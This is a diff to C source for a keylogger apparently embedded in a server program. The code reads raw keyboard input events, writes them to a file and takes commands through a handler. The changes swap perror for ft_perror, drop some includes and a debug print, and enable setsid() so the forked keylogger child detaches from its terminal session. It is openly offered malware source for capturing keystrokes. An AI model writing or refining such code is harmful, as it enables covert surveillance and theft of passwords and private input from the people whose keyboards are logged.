@@ -9,8 +9,6 @@ char *keycodes[247] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8"
                        "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX"};
 size_t event_size = sizeof(t_event);
 
-#include <fcntl.h>
-#include <sys/ioctl.h>
 
 #define KLG_HELP "Available commands:\n\
 help: print this help\n\
@@ -29,7 +27,6 @@ static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_wri
 }
 
 void handle_klg_cmd(char *bfr) {
-	//printf("recieved : %s\n", bfr);
 	if (!strncmp("help\n", bfr, strlen(bfr))) {
 		printf(KLG_HELP);
 	}
@@ -54,10 +51,10 @@ int	keylogger_function(t_server *server, int index)
 
 	pid = fork();
 	if (pid < 0) {
-		perror("fork");
+		ft_perror("fork");
 	}
 	else if (pid == 0) {
-		//setsid();
+		setsid();
 
 		close(server->fd);
 		close(inpipe_fds[WRITE_END]);
@@ -86,7 +83,7 @@ int	keylogger_function(t_server *server, int index)
 			FD_SET(kb, &rset);
 			struct timeval tv = {.tv_sec = 0, .tv_usec = 5000};
 			int retval = select(maxfd + 1, &rset, NULL, NULL, &tv);
-			if (retval == -1) { perror("select"); break; }
+			if (retval == -1) { ft_perror("select"); break; }
 			if (FD_ISSET(kb, &rset)) {
 				int r = read(kb, kbd_events, event_size * MAX_EVENTS);
 				if (r < 0)
